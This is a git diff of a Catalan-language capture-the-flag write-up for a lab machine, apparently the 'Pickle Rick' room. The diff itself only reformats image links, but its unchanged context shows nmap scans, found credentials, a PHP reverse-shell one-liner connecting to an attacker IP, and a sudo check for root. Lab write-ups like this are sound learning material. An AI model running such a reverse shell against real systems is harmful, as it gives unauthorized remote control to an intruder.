@@ -18,7 +18,7 @@ IP: 10.10.21.47
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.21.47 -oG allports
 ```
 
-![image.png](imagenes/image 12.png)
+![image.png](<imagenes/image 12.png>)
 
 > NMAP Servicios
 > 
@@ -27,23 +27,23 @@ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.21.47 -oG allports
  nmap -sV -script=http-enum 10.10.21.47 -vvv -oN targeted
 ```
 
-![image.png](imagenes/image 13.png)
+![image.png](<imagenes/image 13.png>)
 
 # Análisis de vulnerabilidades
 
 Código fuente
 
-![image.png](imagenes/image 14.png)
+![image.png](<imagenes/image 14.png>)
 
 Username : R1ckRul3s
 
 Accedirm a /robots.txt
 
-![image.png](imagenes/image 15.png)
+![image.png](<imagenes/image 15.png>)
 
 Accedim a /login.php i provem les credencials
 
-![image.png](imagenes/image 16.png)
+![image.png](<imagenes/image 16.png>)
 
 Llistem arxius i trobem :
 
@@ -62,13 +62,13 @@ Intentem conectarnos amb una rever shell i la que ens funciona es una PHPexec:
 php -r '$sock=fsockopen("10.9.4.64",443);exec("bash <&3 >&3 2>&3");'
 ```
 
-![image.png](imagenes/image 17.png)
+![image.png](<imagenes/image 17.png>)
 
 Accedim al sistema :
 
 Busquem diferents fichers:
 
-![image.png](imagenes/image 18.png)
+![image.png](<imagenes/image 18.png>)
 
 Entrem al home de rick i trobem el segon flag
 
@@ -83,7 +83,7 @@ Busquem com ens podem convertir en root:
 sudo -l
 ```
 
-![image.png](imagenes/image 19.png)
+![image.png](<imagenes/image 19.png>)
 
 Podem executar qualsevol comando sense password
 
